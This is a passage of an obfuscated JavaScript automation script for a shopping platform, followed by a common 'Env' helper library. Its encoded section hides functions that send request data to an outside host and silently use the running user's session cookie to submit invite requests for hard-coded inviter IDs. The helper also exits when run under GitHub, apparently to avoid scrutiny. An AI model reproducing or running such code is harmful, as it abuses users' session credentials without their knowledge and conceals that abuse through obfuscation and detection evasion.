c\x43\x42\x73\x61\x57\x74\x6c\x49\x45\x64\x6c\x59\x32\x74\x76\x4b\x53\x42\x57\x5a\x58\x4a\x7a\x61\x57\x39\x75\x4c\x7a\x45\x7a\x4c\x6a\x41\x75\x4d\x79\x42\x4e\x62\x32\x4a\x70\x62\x47\x55\x76\x4d\x54\x56\x46\x4d\x54\x51\x34\x49\x46\x4e\x68\x5a\x6d\x46\x79\x61\x53\x38\x32\x4d\x44\x51\x75\x4d\x53\x42\x46\x5a\x47\x63\x76\x4f\x44\x63\x75\x4d\x43\x34\x30\x4d\x6a\x67\x77\x4c\x6a\x67\x34','\x61\x6d\x4a\x30\x56\x31\x6b\x3d','\x56\x31\x4a\x4a\x54\x45\x59\x3d','\x55\x48\x70\x74\x53\x56\x55\x3d','\x63\x6c\x70\x6e\x64\x45\x77\x3d','\x5a\x6c\x46\x51\x55\x32\x4d\x3d','\x63\x6b\x78\x70\x61\x6b\x4d\x3d','\x54\x46\x52\x33\x54\x6e\x55\x3d','\x52\x6b\x31\x47\x53\x6c\x4d\x3d','\x57\x45\x4e\x48\x64\x57\x73\x3d','\x61\x56\x52\x57\x62\x58\x45\x3d','\x54\x57\x74\x47\x5a\x6c\x6f\x3d','\x54\x55\x35\x71\x63\x58\x6f\x3d','\x5a\x57\x35\x32','\x55\x30\x6c\x48\x54\x6c\x39\x56\x55\x6b\x77\x3d','\x5a\x6d\x78\x76\x62\x33\x49\x3d','\x62\x57\x56\x75\x54\x6c\x6b\x3d','\x63\x6d\x46\x75\x5a\x47\x39\x74','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x75\x62\x6e\x6f\x75\x62\x48\x55\x76\x5a\x32\x56\x30\x61\x44\x56\x7a\x64\x41\x3d\x3d','\x63\x33\x52\x79\x61\x57\x35\x6e\x61\x57\x5a\x35','\x56\x58\x42\x75\x54\x32\x51\x3d','\x61\x58\x4a\x36\x56\x30\x63\x3d','\x49\x6a\x58\x73\x6a\x46\x47\x45\x4f\x69\x58\x6e\x61\x47\x6c\x48\x6d\x69\x2e\x63\x6f\x6d\x2e\x76\x36\x3d\x3d'];if(function(_0x2ea5c5,_0x482867,_0x16a1e8){function _0x573a8e(_0x398fab,_0xa7e7cc,_0x32fe0e,_0x2931f6,_0x154505,_0x39ffd5){_0xa7e7cc=_0xa7e7cc>>0x8,_0x154505='po';var _0x50bae5='shift',_0x4e2915='push',_0x39ffd5='‮';if(_0xa7e7cc<_0x398fab){while(--_0x398fab){_0x2931f6=_0x2ea5c5[_0x50bae5]();if(_0xa7e7cc===_0x398fab&&_0x39ffd5==='‮'&&_0x39ffd5['length']===0x1){_0xa7e7cc=_0x2931f6,_0x32fe0e=_0x2ea5c5[_0x154505+'p']();}else if(_0xa7e7cc&&_0x32fe0e['replace'](/[IXFGEOXnGlH=]/g,'')===_0xa7e7cc){_0x2ea5c5[_0x4e2915](_0x2931f6);}}_0x2ea5c5[_0x4e2915](_0x2ea5c5[_0x50bae5]());}return 0xdcc73;};return _0x573a8e(++_0x482867,_0x16a1e8)>>_0x482867^_0x16a1e8;}(_0x3d1d,0x1bf,0x1bf00),_0x3d1d){_0xodu_=_0x3d1d['length']^0x1bf;};function _0x274a(_0x48755a,_0x119254){_0x48755a=~~'0x'['concat'](_0x48755a['slice'](0x1));var _0x3aa030=_0x3d1d[_0x48755a];if(_0x274a['dsjKQF']===undefined&&'‮'['length']===0x1){(function(){var _0x22a628;try{var _0x29c3c6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x22a628=_0x29c3c6();}catch(_0x18463e){_0x22a628=window;}var _0x42bce2='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x22a628['atob']||(_0x22a628['atob']=function(_0x182008){var _0x2798ff=String(_0x182008)['replace'](/=+$/,'');for(var _0x496839=0x0,_0x3c34f5,_0x5a311a,_0x1fd1bd=0x0,_0x36cb99='';_0x5a311a=_0x2798ff['charAt'](_0x1fd1bd++);~_0x5a311a&&(_0x3c34f5=_0x496839%0x4?_0x3c34f5*0x40+_0x5a311a:_0x5a311a,_0x496839++%0x4)?_0x36cb99+=String['fromCharCode'](0xff&_0x3c34f5>>(-0x2*_0x496839&0x6)):0x0){_0x5a311a=_0x42bce2['indexOf'](_0x5a311a);}return _0x36cb99;});}());_0x274a['QgGeoD']=function(_0x8ea09c){var _0x44a5f4=atob(_0x8ea09c);var _0x4c0c8e=[];for(var _0x3ca7b6=0x0,_0x568116=_0x44a5f4['length'];_0x3ca7b6<_0x568116;_0x3ca7b6++){_0x4c0c8e+='%'+('00'+_0x44a5f4['charCodeAt'](_0x3ca7b6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4c0c8e);};_0x274a['IpLUew']={};_0x274a['dsjKQF']=!![];}var _0x1e3254=_0x274a['IpLUew'][_0x48755a];if(_0x1e3254===undefined){_0x3aa030=_0x274a['QgGeoD'](_0x3aa030);_0x274a['IpLUew'][_0x48755a]=_0x3aa030;}else{_0x3aa030=_0x1e3254;}return _0x3aa030;};function geth5st(_0x401d03,_0x1cecf6){var _0x482fda={'\x6b\x78\x5a\x49\x48':function(_0x5685e5,_0x39055d){return _0x5685e5!=_0x39055d;},'\x69\x4d\x48\x51\x6a':function(_0xd68592,_0x4f5f61){return _0xd68592 instanceof _0x4f5f61;},'\x50\x7a\x6d\x49\x55':function(_0x511314,_0x22c687){return _0x511314===_0x22c687;},'\x59\x6f\x6a\x4f\x57':function(_0x4c2d93,_0x8e3047){return _0x4c2d93>_0x8e3047;},'\x61\x77\x48\x79\x4a':function(_0x343f25,_0x453592){return _0x343f25!==_0x453592;},'\x54\x69\x4e\x76\x4e':_0x274a('‮0'),'\x47\x47\x47\x4c\x72':_0x274a('‮1'),'\x73\x58\x63\x6c\x45':function(_0x3f37d4,_0x1ca71d){return _0x3f37d4!==_0x1ca71d;},'\x4d\x4c\x6a\x63\x77':_0x274a('‫2'),'\x58\x43\x47\x75\x6b':function(_0x42e889,_0x342e8b){return _0x42e889!==_0x342e8b;},'\x50\x52\x56\x71\x44':_0x274a('‮3'),'\x4a\x51\x6a\x64\x6e':function(_0x1bf3c0,_0x25d9ad){return _0x1bf3c0(_0x25d9ad);},'\x4d\x79\x49\x4c\x6a':_0x274a('‫4'),'\x70\x73\x64\x45\x58':_0x274a('‫5'),'\x49\x47\x66\x76\x68':_0x274a('‫6'),'\x72\x4f\x70\x66\x6d':_0x274a('‫7'),'\x57\x4b\x52\x42\x54':_0x274a('‮8'),'\x74\x6f\x75\x4b\x48':_0x274a('‫9'),'\x72\x69\x6f\x41\x55':_0x274a('‮a'),'\x6d\x65\x6e\x4e\x59':function(_0x1374a1,_0x2241b4){return _0x1374a1*_0x2241b4;},'\x77\x4e\x53\x45\x44':_0x274a('‮b'),'\x4b\x65\x6c\x6d\x4d':_0x274a('‫c'),'\x52\x42\x79\x4f\x44':_0x274a('‫d'),'\x46\x66\x6a\x4e\x53':_0x274a('‫e'),'\x65\x41\x6c\x6d\x69':_0x274a('‮f'),'\x4d\x48\x62\x54\x66':_0x274a('‮10'),'\x4b\x44\x59\x78\x6b':_0x274a('‮11'),'\x48\x42\x5a\x63\x75':function(_0x3b4314,_0xed78f4){return _0x3b4314(_0xed78f4);},'\x78\x73\x64\x4a\x47':_0x274a('‮12'),'\x52\x6e\x63\x61\x4f':_0x274a('‮13'),'\x65\x74\x54\x73\x6c':_0x274a('‫14'),'\x53\x51\x66\x74\x63':_0x274a('‮15'),'\x49\x78\x62\x53\x4a':_0x274a('‫16'),'\x6a\x62\x74\x57\x59':function(_0x163b4a,_0x126cd3){return _0x163b4a!=_0x126cd3;},'\x57\x52\x49\x4c\x46':function(_0x56a634,_0x3e6f88){return _0x56a634 instanceof _0x3e6f88;},'\x72\x5a\x67\x74\x4c':function(_0x57d811,_0x47fba3){return _0x57d811===_0x47fba3;},'\x66\x51\x50\x53\x63':_0x274a('‫17'),'\x72\x4c\x69\x6a\x43':_0x274a('‮18'),'\x4c\x54\x77\x4e\x75':_0x274a('‫19'),'\x46\x4d\x46\x4a\x53':_0x274a('‮1a'),'\x69\x54\x56\x6d\x71':_0x274a('‮1b'),'\x4d\x6b\x46\x66\x5a':_0x274a('‮1c'),'\x4d\x4e\x6a\x71\x7a':_0x274a('‫1d'),'\x55\x70\x6e\x4f\x64':_0x274a('‮1e'),'\x69\x72\x7a\x57\x47':_0x274a('‮1f'),'\x78\x71\x56\x6d\x52':function(_0x990d80,_0x59e26f){return _0x990d80*_0x59e26f;}};return new Promise(async _0x26ba01=>{var _0x2e3bc3={'\x56\x45\x63\x75\x6e':function(_0x30100d,_0x31e203){return _0x482fda[_0x274a('‮20')](_0x30100d,_0x31e203);},'\x56\x73\x4c\x55\x6b':function(_0x5d2dbd,_0x4fa95c){return _0x482fda[_0x274a('‮21')](_0x5d2dbd,_0x4fa95c);},'\x6a\x64\x6d\x48\x52':function(_0x564be4,_0x46af9c){return _0x482fda[_0x274a('‮21')](_0x564be4,_0x46af9c);},'\x6d\x56\x42\x48\x61':function(_0x484fbd,_0x4b4c43){return _0x482fda[_0x274a('‮22')](_0x484fbd,_0x4b4c43);},'\x6e\x69\x49\x7a\x73':function(_0x5b44e,_0x4864da){return _0x482fda[_0x274a('‮23')](_0x5b44e,_0x4864da);},'\x64\x4f\x5a\x42\x4d':_0x482fda[_0x274a('‫24')],'\x48\x68\x43\x4e\x41':_0x482fda[_0x274a('‫25')],'\x6d\x6a\x74\x50\x79':_0x482fda[_0x274a('‫26')],'\x71\x77\x66\x5a\x4b':_0x482fda[_0x274a('‫27')]};if(_0x482fda[_0x274a('‫28')](_0x482fda[_0x274a('‮29')],_0x482fda[_0x274a('‮2a')])){let _0x1d0e6a={'\x61\x70\x70\x49\x64':_0x401d03,'\x62\x6f\x64\x79':_0x1cecf6};let _0x2281a8='';let _0x2faa3=[_0x482fda[_0x274a('‫2b')]];if(process[_0x274a('‫2c')][_0x274a('‮2d')]){_0x2281a8=process[_0x274a('‫2c')][_0x274a('‮2d')];}else{_0x2281a8=_0x2faa3[Math[_0x274a('‮2e')](_0x482fda[_0x274a('‫2f')](Math[_0x274a('‫30')](),_0x2faa3[_0x274a('‮31')]))];}let _0x4030c9={'\x75\x72\x6c':_0x274a('‮32'),'\x62\x6f\x64\x79':JSON[_0x274a('‫33')](_0x1d0e6a),'\x68\x65\x61\x64\x65\x72\x73':{'\x48\x6f\x73\x74':_0x2281a8,'Content-Type':_0x482fda[_0x274a('‮34')],'User-Agent':_0x482fda[_0x274a('‮35')]},'\x74\x69\x6d\x65\x6f\x75\x74':_0x482fda[_0x274a('‫36')](0x1e,0x3e8)};$[_0x274a('‮37')](_0x4030c9,(_0x531e60,_0x21eea6,_0x1d0e6a)=>{var _0x4197e1={'\x4b\x4b\x79\x49\x64':function(_0x10becc,_0x36646c){return _0x482fda[_0x274a('‫38')](_0x10becc,_0x36646c);},'\x4e\x6b\x62\x6d\x55':function(_0x5c1970,_0x1b728c){return _0x482fda[_0x274a('‮39')](_0x5c1970,_0x1b728c);},'\x59\x62\x6a\x4a\x74':function(_0x49534d,_0xbc56e7){return _0x482fda[_0x274a('‮22')](_0x49534d,_0xbc56e7);},'\x65\x73\x73\x65\x79':function(_0x167d3a,_0x5f0cdf){return _0x482fda[_0x274a('‮22')](_0x167d3a,_0x5f0cdf);},'\x6c\x49\x59\x73\x65':function(_0x570d7d,_0xdb841f){return _0x482fda[_0x274a('‮3a')](_0x570d7d,_0xdb841f);},'\x61\x50\x4b\x42\x61':function(_0x5424cd,_0x174e71){return _0x482fda[_0x274a('‮3b')](_0x5424cd,_0x174e71);}};try{if(_0x482fda[_0x274a('‮3b')](_0x482fda[_0x274a('‫3c')],_0x482fda[_0x274a('‫3c')])){var _0x2873b4=_0x4197e1[_0x274a('‫3d')](arguments[_0x274a('‮31')],0x0)&&_0x4197e1[_0x274a('‫3e')](void 0x0,arguments[0x0])?arguments[0x0]:{},_0x1d7b4a='';return Object[_0x274a('‫3f')](_0x2873b4)[_0x274a('‫40')](function(_0x921e3){var _0x16d0f4=_0x2873b4[_0x921e3];_0x4197e1[_0x274a('‫41')](null,_0x16d0f4)&&(_0x1d7b4a+=_0x4197e1[_0x274a('‫42')](_0x16d0f4,Object)||_0x4197e1[_0x274a('‫42')](_0x16d0f4,Array)?''+(_0x4197e1[_0x274a('‫43')]('',_0x1d7b4a)?'':'\x26')+_0x921e3+'\x3d'+JSON[_0x274a('‫33')](_0x16d0f4):''+(_0x4197e1[_0x274a('‮44')]('',_0x1d7b4a)?'':'\x26')+_0x921e3+'\x3d'+_0x16d0f4);}),_0x1d7b4a;}else{if(_0x531e60){if(_0x482fda[_0x274a('‮22')](_0x482fda[_0x274a('‫45')],_0x482fda[_0x274a('‫45')])){console[_0x274a('‫46')](''+JSON[_0x274a('‫33')](_0x531e60));console[_0x274a('‫46')]($[_0x274a('‮47')]+_0x274a('‫48'));}else{var _0x302dbe=e[n];_0x2e3bc3[_0x274a('‮49')](null,_0x302dbe)&&(t+=_0x2e3bc3[_0x274a('‮4a')](_0x302dbe,Object)||_0x2e3bc3[_0x274a('‮4b')](_0x302dbe,Array)?''+(_0x2e3bc3[_0x274a('‮4c')]('',t)?'':'\x26')+n+'\x3d'+JSON[_0x274a('‫33')](_0x302dbe):''+(_0x2e3bc3[_0x274a('‮4d')]('',t)?'':'\x26')+n+'\x3d'+_0x302dbe);}}else{}}}catch(_0xb677b3){if(_0x482fda[_0x274a('‫4e')](_0x482fda[_0x274a('‫4f')],_0x482fda[_0x274a('‫4f')])){res[_0x2e3bc3[_0x274a('‫50')]]='\x48\x35';res[_0x2e3bc3[_0x274a('‮51')]]=_0x2e3bc3[_0x274a('‮52')];_0x401d03=_0x2e3bc3[_0x274a('‫53')];}else{$[_0x274a('‫54')](_0xb677b3,_0x21eea6);}}finally{if(_0x482fda[_0x274a('‫28')](_0x482fda[_0x274a('‫55')],_0x482fda[_0x274a('‫55')])){console[_0x274a('‫46')](''+JSON[_0x274a('‫33')](_0x531e60));console[_0x274a('‫46')]($[_0x274a('‮47')]+_0x274a('‫48'));}else{_0x482fda[_0x274a('‮56')](_0x26ba01,_0x1d0e6a);}}});}else{$[_0x274a('‮57')]=_0x482fda[_0x274a('‮58')];const _0x1fac39=[_0x482fda[_0x274a('‮59')],_0x482fda[_0x274a('‮5a')],_0x482fda[_0x274a('‫5b')],_0x482fda[_0x274a('‮5c')],_0x482fda[_0x274a('‮5d')],_0x482fda[_0x274a('‮5e')]];let _0x182fa0=_0x1fac39[Math[_0x274a('‮2e')](_0x482fda[_0x274a('‫2f')](Math[_0x274a('‫30')](),_0x1fac39[_0x274a('‮31')]))];let _0x232a37={'\x75\x72\x6c':_0x482fda[_0x274a('‮5f')],'\x62\x6f\x64\x79':_0x274a('‮60')+JSON[_0x274a('‫33')]({'method':_0x482fda[_0x274a('‫61')],'data':{'channel':'\x31','encryptionInviterPin':_0x482fda[_0x274a('‮56')](encodeURIComponent,_0x182fa0),'type':0x1}})+_0x274a('‫62')+Date[_0x274a('‮63')](),'\x68\x65\x61\x64\x65\x72\x73':{'Host':_0x482fda[_0x274a('‫64')],'Accept':_0x482fda[_0x274a('‫65')],'Content-Type':_0x482fda[_0x274a('‮66')],'Origin':_0x482fda[_0x274a('‮67')],'Accept-Language':_0x482fda[_0x274a('‮68')],'User-Agent':$[_0x274a('‫69')]()?process[_0x274a('‫2c')][_0x274a('‫6a')]?process[_0x274a('‫2c')][_0x274a('‫6a')]:_0x482fda[_0x274a('‮6b')](require,_0x482fda[_0x274a('‫6c')])[_0x274a('‮6d')]:$[_0x274a('‫6e')](_0x482fda[_0x274a('‫6f')])?$[_0x274a('‫6e')](_0x482fda[_0x274a('‫6f')]):_0x482fda[_0x274a('‮70')],'Referer':_0x482fda[_0x274a('‫71')],'Accept-Encoding':_0x482fda[_0x274a('‫72')],'Cookie':cookie}};$[_0x274a('‮37')](_0x232a37,(_0x3218d4,_0x264e96,_0x2f7f90)=>{});}});}async function getSign(_0x3f2694='',_0x4c5477={},_0xa33af1=![]){var _0x2e66d8={'\x46\x4a\x58\x4d\x41':_0x274a('‮73'),'\x67\x76\x6b\x6b\x69':function(_0x166f45,_0x132d54){return _0x166f45===_0x132d54;},'\x59\x52\x76\x41\x42':_0x274a('‮74'),'\x42\x76\x42\x6a\x6c':_0x274a('‫17'),'\x6c\x48\x77\x58\x65':_0x274a('‮18'),'\x73\x47\x74\x61\x76':_0x274a('‫19'),'\x76\x67\x43\x63\x45':_0x274a('‮1a'),'\x6e\x70\x61\x4e\x57':function(_0x151e21,_0x516e92){return _0x151e21!==_0x516e92;},'\x56\x7a\x56\x6f\x45':_0x274a('‮75'),'\x4c\x4f\x4a\x43\x58':_0x274a('‫76'),'\x64\x4e\x76\x42\x75':function(_0x88304,_0x1b0d54){return _0x88304(_0x1b0d54);},'\x6d\x64\x6f\x4e\x4c':function(_0x20a957,_0x5d8ddf,_0x59ed2a){return _0x20a957(_0x5d8ddf,_0x59ed2a);},'\x57\x7a\x6c\x67\x48':function(_0x38e3df,_0x31fd38){return _0x38e3df!==_0x31fd38;},'\x6b\x75\x69\x6f\x68':_0x274a('‫77')};let _0x3407e7=_0x2e66d8[_0x274a('‮78')];let _0x130f3d={'\x66\x75\x6e\x63\x74\x69\x6f\x6e\x49\x64':_0x3f2694,'\x62\x6f\x64\x79':JSON[_0x274a('‫33')](_0x4c5477),'\x74':Date[_0x274a('‮63')](),'\x61\x70\x70\x69\x64':$[_0x274a('‮57')]};if(_0x2e66d8[_0x274a('‫79')](_0x3f2694,_0x2e66d8[_0x274a('‮7a')])){_0x130f3d[_0x2e66d8[_0x274a('‫7b')]]='\x48\x35';_0x130f3d[_0x2e66d8[_0x274a('‫7c')]]=_0x2e66d8[_0x274a('‫7d')];_0x3407e7=_0x2e66d8[_0x274a('‮7e')];}if(_0xa33af1){if(_0x2e66d8[_0x274a('‮7f')](_0x2e66d8[_0x274a('‫80')],_0x2e66d8[_0x274a('‫81')])){Object[_0x274a('‮82')](_0x130f3d,{'\x68\x35\x73\x74':_0x2e66d8[_0x274a('‮83')](encodeURIComponent,await _0x2e66d8[_0x274a('‮84')](geth5st,_0x3407e7,_0x130f3d))});}else{Host=process[_0x274a('‫2c')][_0x274a('‮2d')];}}if(_0x2e66d8[_0x274a('‮85')](_0x3f2694,_0x2e66d8[_0x274a('‮7a')])){_0x130f3d[_0x2e66d8[_0x274a('‮86')]]=_0x2e66d8[_0x274a('‮83')](encodeURIComponent,_0x130f3d[_0x2e66d8[_0x274a('‮86')]]);}return _0x2e66d8[_0x274a('‮83')](objToStr2,_0x130f3d);}function objToStr2(){var _0x42b1ed={'\x79\x50\x6f\x56\x75':function(_0x16a78e,_0x4dea24){return _0x16a78e(_0x4dea24);},'\x45\x73\x6d\x4a\x61':function(_0x55ee30,_0x155ff4){return _0x55ee30!==_0x155ff4;},'\x50\x66\x6e\x7a\x56':_0x274a('‫87'),'\x65\x6d\x48\x54\x64':_0x274a('‮88'),'\x64\x76\x4d\x6f\x4e':function(_0x578517,_0x125ead){return _0x578517!=_0x125ead;},'\x5a\x64\x45\x78\x6a':function(_0x182246,_0x576de1){return _0x182246 instanceof _0x576de1;},'\x61\x46\x43\x63\x66':function(_0x14752a,_0x1edecd){return _0x14752a instanceof _0x1edecd;},'\x69\x44\x43\x46\x6a':function(_0x28596a,_0x410cb1){return _0x28596a===_0x410cb1;},'\x6b\x75\x62\x6a\x54':function(_0x1b70ec,_0x230e96){return _0x1b70ec>_0x230e96;}};var _0x2a9e58=_0x42b1ed[_0x274a('‫89')](arguments[_0x274a('‮31')],0x0)&&_0x42b1ed[_0x274a('‮8a')](void 0x0,arguments[0x0])?arguments[0x0]:{},_0x19e45d='';return Object[_0x274a('‫3f')](_0x2a9e58)[_0x274a('‫40')](function(_0x4b150e){if(_0x42b1ed[_0x274a('‮8a')](_0x42b1ed[_0x274a('‮8b')],_0x42b1ed[_0x274a('‮8c')])){var _0x377e85=_0x2a9e58[_0x4b150e];_0x42b1ed[_0x274a('‮8d')](null,_0x377e85)&&(_0x19e45d+=_0x42b1ed[_0x274a('‫8e')](_0x377e85,Object)||_0x42b1ed[_0x274a('‫8f')](_0x377e85,Array)?''+(_0x42b1ed[_0x274a('‮90')]('',_0x19e45d)?'':'\x26')+_0x4b150e+'\x3d'+JSON[_0x274a('‫33')](_0x377e85):''+(_0x42b1ed[_0x274a('‮90')]('',_0x19e45d)?'':'\x26')+_0x4b150e+'\x3d'+_0x377e85);}else{_0x42b1ed[_0x274a('‮91')](resolve,data);}}),_0x19e45d;}function invite2(){var _0x9eeda8={'\x42\x65\x65\x51\x65':_0x274a('‫4'),'\x58\x77\x4f\x6d\x47':_0x274a('‫5'),'\x6d\x73\x70\x76\x69':_0x274a('‫6'),'\x6e\x54\x4c\x66\x55':_0x274a('‫7'),'\x43\x4c\x6d\x74\x65':_0x274a('‮8'),'\x77\x67\x49\x69\x72':_0x274a('‫9'),'\x72\x66\x43\x57\x4a':_0x274a('‮a'),'\x4f\x65\x47\x67\x59':function(_0x47536c,_0x3b3234){return _0x47536c*_0x3b3234;},'\x64\x74\x55\x6c\x7a':_0x274a('‮b'),'\x4d\x6e\x56\x76\x53':_0x274a('‫c'),'\x51\x69\x48\x78\x69':function(_0x3f0522,_0x43c904){return _0x3f0522(_0x43c904);},'\x43\x55\x50\x79\x68':_0x274a('‫d'),'\x79\x77\x63\x45\x4c':_0x274a('‫e'),'\x62\x45\x6f\x4e\x49':_0x274a('‮f'),'\x70\x70\x6a\x63\x62':_0x274a('‮10'),'\x6b\x4c\x56\x78\x69':_0x274a('‮11'),'\x71\x49\x77\x57\x65':_0x274a('‮12'),'\x65\x6e\x44\x6f\x58':_0x274a('‮13'),'\x78\x62\x55\x75\x6a':_0x274a('‫14'),'\x56\x61\x54\x6c\x51':_0x274a('‮15'),'\x71\x41\x51\x70\x76':_0x274a('‫16')};$[_0x274a('‮57')]=_0x9eeda8[_0x274a('‮92')];const _0x376dd1=[_0x9eeda8[_0x274a('‫93')],_0x9eeda8[_0x274a('‫94')],_0x9eeda8[_0x274a('‫95')],_0x9eeda8[_0x274a('‫96')],_0x9eeda8[_0x274a('‫97')],_0x9eeda8[_0x274a('‫98')]];let _0x46ea48=_0x376dd1[Math[_0x274a('‮2e')](_0x9eeda8[_0x274a('‫99')](Math[_0x274a('‫30')](),_0x376dd1[_0x274a('‮31')]))];let _0x86bd5d={'\x75\x72\x6c':_0x9eeda8[_0x274a('‮9a')],'\x62\x6f\x64\x79':_0x274a('‮60')+JSON[_0x274a('‫33')]({'method':_0x9eeda8[_0x274a('‫9b')],'data':{'channel':'\x31','encryptionInviterPin':_0x9eeda8[_0x274a('‮9c')](encodeURIComponent,_0x46ea48),'type':0x1}})+_0x274a('‫62')+Date[_0x274a('‮63')](),'\x68\x65\x61\x64\x65\x72\x73':{'Host':_0x9eeda8[_0x274a('‫9d')],'Accept':_0x9eeda8[_0x274a('‮9e')],'Content-Type':_0x9eeda8[_0x274a('‮9f')],'Origin':_0x9eeda8[_0x274a('‮a0')],'Accept-Language':_0x9eeda8[_0x274a('‮a1')],'User-Agent':$[_0x274a('‫69')]()?process[_0x274a('‫2c')][_0x274a('‫6a')]?process[_0x274a('‫2c')][_0x274a('‫6a')]:_0x9eeda8[_0x274a('‮9c')](require,_0x9eeda8[_0x274a('‮a2')])[_0x274a('‮6d')]:$[_0x274a('‫6e')](_0x9eeda8[_0x274a('‫a3')])?$[_0x274a('‫6e')](_0x9eeda8[_0x274a('‫a3')]):_0x9eeda8[_0x274a('‮a4')],'Referer':_0x9eeda8[_0x274a('‫a5')],'Accept-Encoding':_0x9eeda8[_0x274a('‫a6')],'Cookie':cookie}};$[_0x274a('‮37')](_0x86bd5d,(_0x276a9b,_0x5774db,_0x5d854a)=>{});};_0xodu='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete 